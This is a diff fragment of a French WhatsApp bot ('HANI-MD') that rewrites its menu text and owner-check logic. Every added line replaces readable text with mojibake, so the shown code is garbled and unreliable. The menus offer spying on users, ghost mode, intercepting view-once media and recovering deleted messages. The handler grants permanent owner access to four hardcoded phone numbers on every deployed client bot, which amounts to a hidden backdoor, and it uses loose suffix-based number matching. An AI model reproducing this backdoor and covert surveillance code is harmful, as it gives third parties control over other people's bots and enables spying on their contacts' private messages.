+â”Œâ”€â”€â”€ã€Œ ðŸ“Œ BASIQUES ã€â”€â”€â”€â”
+â”‚ ${prefix}menu â€¢ ${prefix}ping â€¢ ${prefix}info
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 
-┌───「 👥 GROUPE 」───┐
-│ ${prefix}kick    ➜ Exclure
-│ ${prefix}add     ➜ Ajouter
-│ ${prefix}promote ➜ Promouvoir
-│ ${prefix}demote  ➜ Rétrograder
-│ ${prefix}link    ➜ Lien groupe
-│ ${prefix}tagall  ➜ Tag tous
-└──────────────────────┘
+â”Œâ”€â”€â”€ã€Œ ðŸ‘¥ GROUPE ã€â”€â”€â”€â”
+â”‚ ${prefix}kick    âžœ Exclure
+â”‚ ${prefix}add     âžœ Ajouter
+â”‚ ${prefix}promote âžœ Promouvoir
+â”‚ ${prefix}demote  âžœ RÃ©trograder
+â”‚ ${prefix}link    âžœ Lien groupe
+â”‚ ${prefix}tagall  âžœ Tag tous
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 
-┌───「 👑 GESTION 」───┐
-│ ${prefix}approve • ${prefix}ban
-└──────────────────────┘
+â”Œâ”€â”€â”€ã€Œ ðŸ‘‘ GESTION ã€â”€â”€â”€â”
+â”‚ ${prefix}approve â€¢ ${prefix}ban
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 
-┌───「 🔒 RÉSERVÉ OWNER 」───┐
-│ ❌ sudo/delsudo
-│ ❌ Protections avancées
-└────────────────────────────┘
+â”Œâ”€â”€â”€ã€Œ ðŸ”’ RÃ‰SERVÃ‰ OWNER ã€â”€â”€â”€â”
+â”‚ âŒ sudo/delsudo
+â”‚ âŒ Protections avancÃ©es
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 `;
   }
   
-  // Menu COMPLET pour OWNER - Format moderne et aéré
+  // Menu COMPLET pour OWNER - Format moderne et aÃ©rÃ©
   return `
-┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
-┃      ╔═════════════════════════╗      ┃
-┃      ║   🤖 *HANI-MD V2.6.0*   ║      ┃
-┃      ║     _by H2025 SECURE_   ║      ┃
-┃      ╚═════════════════════════╝      ┃
-┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
-┃  ${greeting}! 👑                         ┃
-┃  📌 Préfixe: *${prefix}*  │  🤖 Mode: *${config.MODE}*     ┃
-┃  👑 Rôle: *OWNER* - Accès Total        ┃
-┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”“
+â”ƒ      â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—      â”ƒ
+â”ƒ      â•‘   ðŸ¤– *HANI-MD V2.6.0*   â•‘      â”ƒ
+â”ƒ      â•‘     _by H2025 SECURE_   â•‘      â”ƒ
+â”ƒ      â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•      â”ƒ
+â”£â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”«
+â”ƒ  ${greeting}! ðŸ‘‘                         â”ƒ
+â”ƒ  ðŸ“Œ PrÃ©fixe: *${prefix}*  â”‚  ðŸ¤– Mode: *${config.MODE}*     â”ƒ
+â”ƒ  ðŸ‘‘ RÃ´le: *OWNER* - AccÃ¨s Total        â”ƒ
+â”—â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”›
 
-╔══════════════════════════════════════╗
-║           📋 *CATÉGORIES*            ║
-╠══════════════════════════════════════╣
+â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
+â•‘           ðŸ“‹ *CATÃ‰GORIES*            â•‘
+â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£
 
-┌─────────「 📌 GÉNÉRAL 」─────────┐
-│ ${prefix}ping     │ ${prefix}info     │ ${prefix}stats
-│ ${prefix}whoami   │ ${prefix}menu     │ ${prefix}uptime
-└──────────────────────────────────────┘
+â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ã€Œ ðŸ“Œ GÃ‰NÃ‰RAL ã€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
+â”‚ ${prefix}ping     â”‚ ${prefix}info     â”‚ ${prefix}stats
+â”‚ ${prefix}whoami   â”‚ ${prefix}menu     â”‚ ${prefix}uptime
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 
-┌─────────「 🔧 OUTILS 」─────────┐
-│ ${prefix}sticker  ➜ Image/Vidéo → Sticker
-│ ${prefix}toimg    ➜ Sticker → Image
-│ ${prefix}calc     ➜ Calculatrice
-│ ${prefix}tts      ➜ Texte → Audio
-│ ${prefix}song     ➜ Télécharger musique
-└──────────────────────────────────────┘
+â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ã€Œ ðŸ”§ OUTILS ã€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
+â”‚ ${prefix}sticker  âžœ Image/VidÃ©o â†’ Sticker
+â”‚ ${prefix}toimg    âžœ Sticker â†’ Image
+â”‚ ${prefix}calc     âžœ Calculatrice
+â”‚ ${prefix}tts      âžœ Texte â†’ Audio
+â”‚ ${prefix}song     âžœ TÃ©lÃ©charger musique
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 
-┌─────────「 👥 GROUPE 」─────────┐
-│ ${prefix}kick @   │ ${prefix}add n°   │ ${prefix}link
-│ ${prefix}promote  │ ${prefix}demote   │ ${prefix}tagall
-│ ${prefix}hidetag  │ ${prefix}warn     │ ${prefix}warnlist
-└──────────────────────────────────────┘
+â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ã€Œ ðŸ‘¥ GROUPE ã€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
+â”‚ ${prefix}kick @   â”‚ ${prefix}add nÂ°   â”‚ ${prefix}link
+â”‚ ${prefix}promote  â”‚ ${prefix}demote   â”‚ ${prefix}tagall
+â”‚ ${prefix}hidetag  â”‚ ${prefix}warn     â”‚ ${prefix}warnlist
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 
-┌─────────「 🛡️ PROTECTIONS 」─────────┐
-│ ${prefix}antilink  │ ${prefix}antispam  │ ${prefix}antibot
-│ ${prefix}protection ➜ Voir état global
-└──────────────────────────────────────────┘
+â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ã€Œ ðŸ›¡ï¸ PROTECTIONS ã€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
+â”‚ ${prefix}antilink  â”‚ ${prefix}antispam  â”‚ ${prefix}antibot
+â”‚ ${prefix}protection âžœ Voir Ã©tat global
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 
-┌─────────「 👁️ VUE UNIQUE 」─────────┐
-│ ${prefix}vv       ➜ Récupérer (répondre)
-│ ${prefix}listvv   ➜ Liste interceptées
-│ ${prefix}viewonce ➜ on/off
-└──────────────────────────────────────────┘
+â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ã€Œ ðŸ‘ï¸ VUE UNIQUE ã€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
+â”‚ ${prefix}vv       âžœ RÃ©cupÃ©rer (rÃ©pondre)
+â”‚ ${prefix}listvv   âžœ Liste interceptÃ©es
+â”‚ ${prefix}viewonce âžœ on/off
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 
-┌─────────「 🗑️ ANTI-DELETE 」─────────┐
-│ ${prefix}antidelete ➜ on/off
-│ ${prefix}deleted    ➜ Voir supprimés
-└──────────────────────────────────────────┘
+â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ã€Œ ðŸ—‘ï¸ ANTI-DELETE ã€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
+â”‚ ${prefix}antidelete âžœ on/off
+â”‚ ${prefix}deleted    âžœ Voir supprimÃ©s
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 
-┌─────────「 📸 STATUTS 」─────────┐
-│ ${prefix}savestatus  ➜ on/off
-│ ${prefix}liststatus  ➜ Liste sauvés
-│ ${prefix}getstatus   ➜ Récupérer [n°]
-└──────────────────────────────────────┘
+â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ã€Œ ðŸ“¸ STATUTS ã€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
+â”‚ ${prefix}savestatus  âžœ on/off
+â”‚ ${prefix}liststatus  âžœ Liste sauvÃ©s
+â”‚ ${prefix}getstatus   âžœ RÃ©cupÃ©rer [nÂ°]
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 
-┌─────────「 👑 GESTION USERS 」─────────┐
-│ ${prefix}approve  │ ${prefix}unapprove │ ${prefix}ban
-│ ${prefix}unban    │ ${prefix}sudo      │ ${prefix}delsudo
-│ ${prefix}mode     ➜ public/private
-└───────────────────────────────────────────┘
+â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ã€Œ ðŸ‘‘ GESTION USERS ã€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
+â”‚ ${prefix}approve  â”‚ ${prefix}unapprove â”‚ ${prefix}ban
+â”‚ ${prefix}unban    â”‚ ${prefix}sudo      â”‚ ${prefix}delsudo
+â”‚ ${prefix}mode     âžœ public/private
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 
-┌─────────「 🕵️ ESPIONNAGE 」─────────┐
-│ ${prefix}spyon     │ ${prefix}spyoff    │ ${prefix}spyread
-│ ${prefix}spyreply  │ ${prefix}spystatus │ ${prefix}spyhistory
-│ ${prefix}spy @user ➜ Surveiller quelqu'un
-│ ${prefix}ghost     ➜ Mode fantôme on/off
-└────────────────────────────────────────┘
+â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ã€Œ ðŸ•µï¸ ESPIONNAGE ã€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
+â”‚ ${prefix}spyon     â”‚ ${prefix}spyoff    â”‚ ${prefix}spyread
+â”‚ ${prefix}spyreply  â”‚ ${prefix}spystatus â”‚ ${prefix}spyhistory
+â”‚ ${prefix}spy @user âžœ Surveiller quelqu'un
+â”‚ ${prefix}ghost     âžœ Mode fantÃ´me on/off
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 
-┌─────────「 📅 PROGRAMMATION 」─────────┐
-│ ${prefix}schedule [n°] [heure] [msg]
-│ ${prefix}schedulelist    │ ${prefix}scheduledel
-│ ${prefix}statusschedule  ➜ Statuts programmés
-└─────────────────────────────────────────┘
+â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ã€Œ ðŸ“… PROGRAMMATION ã€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
+â”‚ ${prefix}schedule [nÂ°] [heure] [msg]
+â”‚ ${prefix}schedulelist    â”‚ ${prefix}scheduledel
+â”‚ ${prefix}statusschedule  âžœ Statuts programmÃ©s
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 
-┌─────────「 🎵 TÉLÉCHARGEMENT 」─────────┐
-│ ${prefix}play     ➜ YouTube audio (MP3)
-│ ${prefix}video    ➜ YouTube vidéo (MP4)
-│ ${prefix}spotify  ➜ Spotify audio
-│ ${prefix}spsearch ➜ Recherche Spotify
-├──────── Réseaux Sociaux ────────┤
-│ ${prefix}tiktok   ➜ TikTok sans watermark
-│ ${prefix}fb       ➜ Vidéo Facebook
-│ ${prefix}ig       ➜ Instagram (photo/vidéo)
-│ ${prefix}twitter  ➜ Twitter/X média
-│ ${prefix}pin      ➜ Pinterest image HD
-└─────────────────────────────────────────┘
+â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ã€Œ ðŸŽµ TÃ‰LÃ‰CHARGEMENT ã€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
+â”‚ ${prefix}play     âžœ YouTube audio (MP3)
+â”‚ ${prefix}video    âžœ YouTube vidÃ©o (MP4)
+â”‚ ${prefix}spotify  âžœ Spotify audio
+â”‚ ${prefix}spsearch âžœ Recherche Spotify
+â”œâ”€â”€â”€â”€â”€â”€â”€â”€ RÃ©seaux Sociaux â”€â”€â”€â”€â”€â”€â”€â”€â”¤
+â”‚ ${prefix}tiktok   âžœ TikTok sans watermark
+â”‚ ${prefix}fb       âžœ VidÃ©o Facebook
+â”‚ ${prefix}ig       âžœ Instagram (photo/vidÃ©o)
+â”‚ ${prefix}twitter  âžœ Twitter/X mÃ©dia
+â”‚ ${prefix}pin      âžœ Pinterest image HD
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 
-┌─────────「 ⚙️ SYSTÈME 」─────────┐
-│ ${prefix}broadcast [msg] ➜ Diffuser
-│ ${prefix}restart        ➜ Redémarrer
-│ ${prefix}invisible      ➜ on/off
-│ ${prefix}ghost          ➜ Mode fantôme
-└──────────────────────────────────────┘
+â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ã€Œ âš™ï¸ SYSTÃˆME ã€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
+â”‚ ${prefix}broadcast [msg] âžœ Diffuser
+â”‚ ${prefix}restart        âžœ RedÃ©marrer
+â”‚ ${prefix}invisible      âžœ on/off
+â”‚ ${prefix}ghost          âžœ Mode fantÃ´me
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 
-┌─────────「 💎 PREMIUM 」─────────┐
-│ ${prefix}premium   ➜ Voir les plans
-│ ${prefix}myplan    ➜ Mon abonnement
-│ ${prefix}plans     ➜ Comparer les plans
-│ ${prefix}upgrade   ➜ Activer un code
-├──────── 👑 Owner Only ────────┤
-│ ${prefix}gencode   ➜ Générer un code
-│ ${prefix}gencodes  ➜ Générer plusieurs
-│ ${prefix}listcodes ➜ Liste des codes
-│ ${prefix}activercode ➜ Activer pour client
-│ ${prefix}addpremium ➜ Ajouter premium
-├──────── 🚀 Bot Clients ────────┤
-│ ${prefix}deploybot  ➜ Déployer bot client
-│ ${prefix}botclients ➜ Liste bots déployés
-│ ${prefix}stopbot    ➜ Arrêter un bot
-│ ${prefix}deletebot  ➜ Supprimer un bot
-│ ${prefix}premiumhelp ➜ Aide complète
-└──────────────────────────────────────┘
+â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€ã€Œ ðŸ’Ž PREMIUM ã€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
+â”‚ ${prefix}premium   âžœ Voir les plans
+â”‚ ${prefix}myplan    âžœ Mon abonnement
+â”‚ ${prefix}plans     âžœ Comparer les plans
+â”‚ ${prefix}upgrade   âžœ Activer un code
+â”œâ”€â”€â”€â”€â”€â”€â”€â”€ ðŸ‘‘ Owner Only â”€â”€â”€â”€â”€â”€â”€â”€â”¤
+â”‚ ${prefix}gencode   âžœ GÃ©nÃ©rer un code
+â”‚ ${prefix}gencodes  âžœ GÃ©nÃ©rer plusieurs
+â”‚ ${prefix}listcodes âžœ Liste des codes
+â”‚ ${prefix}activercode âžœ Activer pour client
+â”‚ ${prefix}addpremium âžœ Ajouter premium
+â”œâ”€â”€â”€â”€â”€â”€â”€â”€ ðŸš€ Bot Clients â”€â”€â”€â”€â”€â”€â”€â”€â”¤
+â”‚ ${prefix}deploybot  âžœ DÃ©ployer bot client
+â”‚ ${prefix}botclients âžœ Liste bots dÃ©ployÃ©s
+â”‚ ${prefix}stopbot    âžœ ArrÃªter un bot
+â”‚ ${prefix}deletebot  âžœ Supprimer un bot
+â”‚ ${prefix}premiumhelp âžœ Aide complÃ¨te
+â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 
-╔══════════════════════════════════════╗
-║  💡 *Tu as accès à TOUTES les        ║
-║     commandes en tant qu'OWNER!*     ║
-║  📖 Tape ${prefix}help [cmd] pour détails   ║
-╚══════════════════════════════════════╝
+â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
+â•‘  ðŸ’¡ *Tu as accÃ¨s Ã  TOUTES les        â•‘
+â•‘     commandes en tant qu'OWNER!*     â•‘
+â•‘  ðŸ“– Tape ${prefix}help [cmd] pour dÃ©tails   â•‘
+â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 `;
 }
 
-// ═══════════════════════════════════════════════════════════
-// 🎯 GESTIONNAIRE DE COMMANDES
-// ═══════════════════════════════════════════════════════════
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+// ðŸŽ¯ GESTIONNAIRE DE COMMANDES
+// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 
 async function handleCommand(hani, msg, db) {
   const from = msg.key.remoteJid;
   const body = getMessageText(msg);
   
-  // Debug: afficher le texte brut reçu
-  console.log(`[DEBUG] Texte brut reçu: "${body}" | Préfixe attendu: "${config.PREFIXE}"`);
+  // Debug: afficher le texte brut reÃ§u
+  console.log(`[DEBUG] Texte brut reÃ§u: "${body}" | PrÃ©fixe attendu: "${config.PREFIXE}"`);
   
   if (!body || !body.startsWith(config.PREFIXE)) return;
 
@@ -1673,40 +1673,40 @@ async function handleCommand(hani, msg, db) {
   const sender = msg.key.participant || msg.key.remoteJid;
   const pushName = msg.pushName || "Utilisateur";
   
-  // Numéro du bot
+  // NumÃ©ro du bot
   const botNumber = hani.user?.id?.split(":")[0] + "@s.whatsapp.net";
   const botNumberClean = hani.user?.id?.split(":")[0] || "";
   
-  // Vérification owner avec plusieurs formats
+  // VÃ©rification owner avec plusieurs formats
   const senderNumber = extractNumber(sender);
-  // NE PAS supprimer les virgules ici ! On garde la chaîne originale pour split
+  // NE PAS supprimer les virgules ici ! On garde la chaÃ®ne originale pour split
   const ownerNumberRaw = config.NUMERO_OWNER || "";
   
   // Debug pour TOUTES les commandes owner
   console.log(`[CMD: ${command}] Sender: ${senderNumber} | Owners: ${ownerNumberRaw} | Bot: ${botNumberClean}`);
   
-  // 🔐 PAS D'ENREGISTREMENT AUTOMATIQUE
-  // Seul le propriétaire (celui qui a scanné le QR) peut utiliser le bot
-  // Les amis/contacts ne sont PAS enregistrés automatiquement
+  // ðŸ” PAS D'ENREGISTREMENT AUTOMATIQUE
+  // Seul le propriÃ©taire (celui qui a scannÃ© le QR) peut utiliser le bot
+  // Les amis/contacts ne sont PAS enregistrÃ©s automatiquement
   // Pour avoir leur propre bot, ils doivent scanner leur propre QR code
   
-  // Vérification TRÈS SOUPLE pour owner:
-  // Les NUMERO_OWNER dans .env sont owners (peut être plusieurs séparés par virgule)
-  // Le numéro du bot LUI-MÊME peut aussi exécuter des commandes owner (pour le chat "Moi-même")
+  // VÃ©rification TRÃˆS SOUPLE pour owner:
+  // Les NUMERO_OWNER dans .env sont owners (peut Ãªtre plusieurs sÃ©parÃ©s par virgule)
+  // Le numÃ©ro du bot LUI-MÃŠME peut aussi exÃ©cuter des commandes owner (pour le chat "Moi-mÃªme")
   const ownerNumbers = ownerNumberRaw.split(',').map(n => n.trim().replace(/[^0-9]/g, '')).filter(n => n.length > 0);
   
-  // 👑 OWNERS HARDCODÉS (toujours propriétaires même si pas dans .env)
+  // ðŸ‘‘ OWNERS HARDCODÃ‰S (toujours propriÃ©taires mÃªme si pas dans .env)
   const hardcodedOwners = ["22550252467", "225015025267", "66791824998402", "216965239025712"];
   hardcodedOwners.forEach(owner => {
     if (!ownerNumbers.includes(owner)) ownerNumbers.push(owner);
   });
   
-  // 🔑 LE NUMÉRO DU BOT LUI-MÊME EST TOUJOURS OWNER (celui qui a scanné le QR)
+  // ðŸ”‘ LE NUMÃ‰RO DU BOT LUI-MÃŠME EST TOUJOURS OWNER (celui qui a scannÃ© le QR)
   if (botNumberClean && !ownerNumbers.includes(botNumberClean)) {
     ownerNumbers.push(botNumberClean);
   }
   
-  // Fonction pour vérifier si deux numéros correspondent (même partiellement)
+  // Fonction pour vÃ©rifier si deux numÃ©ros correspondent (mÃªme partiellement)
   const numbersMatch = (num1, num2) => {
     if (!num1 || !num2) return false;
     const clean1 = num1.replace(/[^0-9]/g, '');
@@ -1718,42 +1718,42 @@ async function handleCommand(hani, msg, db) {
     }
     // Fin de l'un contient l'autre
     if (clean1.endsWith(clean2) || clean2.endsWith(clean1)) return true;
-    // Les 9 derniers chiffres (numéro standard sans indicatif)
+    // Les 9 derniers chiffres (numÃ©ro standard sans indicatif)
     if (clean1.length >= 9 && clean2.length >= 9) {
       if (clean1.slice(-9) === clean2.slice(-9)) return true;
     }
     return false;
   };
   
-  // 👑 RÈGLE OWNER: Le numéro du bot (qui a scanné le QR) est TOUJOURS owner
+  // ðŸ‘‘ RÃˆGLE OWNER: Le numÃ©ro du bot (qui a scannÃ© le QR) est TOUJOURS owner
   const isOwner = ownerNumbers.some(owner => numbersMatch(senderNumber, owner)) || 
                   numbersMatch(senderNumber, botNumberClean) ||
                   msg.key.fromMe === true;
   console.log(`[OWNER CHECK] Sender: ${senderNumber} | Bot: ${botNumberClean} | Owners: ${ownerNumbers.join(',')} | isOwner: ${isOwner} | fromMe: ${msg.key.fromMe}`);
   
-  // Le bot peut s'envoyer des commandes à lui-même (chat "Moi-même") 
+  // Le bot peut s'envoyer des commandes Ã  lui-mÃªme (chat "Moi-mÃªme") 
   // SEULEMENT si fromMe ET que c'est dans le chat du bot
   const isBotSelf = msg.key.fromMe === true;
   
   console.log(`[DEBUG CMD] 1. isBotSelf=${isBotSelf}, isOwner=${isOwner}`);
   
-  // 🔒 RESTRICTION: SEUL LE PROPRIÉTAIRE PEUT UTILISER LE BOT
+  // ðŸ”’ RESTRICTION: SEUL LE PROPRIÃ‰TAIRE PEUT UTILISER LE BOT
   // Les amis/contacts ne peuvent pas utiliser ce bot
   // Ils doivent scanner leur propre QR code pour avoir leur propre bot
   if (!isOwner && !isBotSelf) {
     // Ignorer silencieusement les commandes des autres personnes
-    console.log(`[BLOCKED] Commande ignorée de ${pushName} (${senderNumber}) - Pas owner`);
+    console.log(`[BLOCKED] Commande ignorÃ©e de ${pushName} (${senderNumber}) - Pas owner`);
     return;
   }
   
-  console.log(`[DEBUG CMD] 2. Passé vérification owner`);
+  console.log(`[DEBUG CMD] 2. PassÃ© vÃ©rification owner`);
   
   const isSudo = db.isSudo(sender) || isOwner || isBotSelf;
   const isGroupMsg = isGroup(from);
   
   console.log(`[DEBUG CMD] 3. isSudo=${isSudo}, isGroupMsg=${isGroupMsg}`);
   
-  // Déterminer le rôle de l'utilisateur pour le menu
+  // DÃ©terminer le rÃ´le de l'utilisateur pour le menu
   const getUserRole = () => {
     if (isOwner || isBotSelf) return "owner";
     if (db.isSudo(sender)) return "sudo";
@@ -1764,15 +1764,15 @@ async function handleCommand(hani, msg, db) {
   
   console.log(`[DEBUG CMD] 4. userRole=${userRole}`);
   
-  // ═══════════════════════════════════════════════════════════
-  // 🔓 BYPASS COMPLET POUR OWNER - AUCUNE VÉRIFICATION BLOQUANTE
-  // ═══════════════════════════════════════════════════════════
-  // L'owner/bot ne peut JAMAIS être banni ou limité
-  // Cela évite les problèmes avec MySQL non connecté
+  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+  // ðŸ”“ BYPASS COMPLET POUR OWNER - AUCUNE VÃ‰RIFICATION BLOQUANTE
+  // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+  // L'owner/bot ne peut JAMAIS Ãªtre banni ou limitÃ©
+  // Cela Ã©vite les problÃ¨mes avec MySQL non connectÃ©
   if (isOwner || isBotSelf) {
-    console.log(`[DEBUG CMD] 5. ✅ OWNER/BOT - Bypass des vérifications ban/limit`);
+    console.log(`[DEBUG CMD] 5. âœ… OWNER/BOT - Bypass des vÃ©rifications ban/limit`);
   } else {
-    // Vérifier si banni (uniquement pour les non-owners)
+    // VÃ©rifier si banni (uniquement pour les non-owners)
     try {
       const isBannedUser = await db.isBanned(sender);
       console.log(`[DEBUG CMD] 5. isBannedUser=${isBannedUser} pour sender=${sender}`);
@@ -1781,29 +1781,29 @@ async function handleCommand(hani, msg, db) {
         return; // Ignorer les utilisateurs bannis
       }
     } catch (e) {
-      console.log(`[DEBUG CMD] ⚠️ Erreur vérification ban (ignorée): ${e.message}`);
+      console.log(`[DEBUG CMD] âš ï¸ Erreur vÃ©rification ban (ignorÃ©e): ${e.message}`);
       // En cas d'erreur MySQL, on laisse passer
     }
 
-    // Vérifier si limité (commande bloquée) - uniquement pour non-owners
+    // VÃ©rifier si limitÃ© (commande bloquÃ©e) - uniquement pour non-owners
     try {
       if (db.isLimited && db.isLimited(sender) && db.isCommandBlocked && db.isCommandBlocked(sender, command)) {
         console.log(`[DEBUG CMD] LIMITED - retour`);
         const limitations = db.getLimitations ? db.getLimitations(sender) : { level: 1 };
         const levelNames = { 1: "Basique", 2: "Moyen", 3: "Strict" };
         await hani.sendMessage(from, { 
-          text: `⚠️ *Accès Limité*\n\nVotre compte a des restrictions (Niveau ${limitations.level} - ${levelNames[limitations.level]}).\n\nCette commande (${command}) n'est pas disponible pour vous.\n\nCommandes autorisées: menu, help, ping` 
+          text: `âš ï¸ *AccÃ¨s LimitÃ©*\n\nVotre compte a des restrictions (Niveau ${limitations.level} - ${levelNames[limitations.level]}).\n\nCette commande (${command}) n'est pas disponible pour vous.\n\nCommandes autorisÃ©es: menu, help, ping` 
         }, { quoted: msg });
         return;
       }
     } catch (e) {
-      console.log(`[DEBUG CMD] ⚠️ Erreur vérification limit (ignorée): ${e.message}`);
+      console.log(`[DEBUG CMD] âš ï¸ Erreur vÃ©rification limit (ignorÃ©e): ${e.message}`);
     }
   }
   
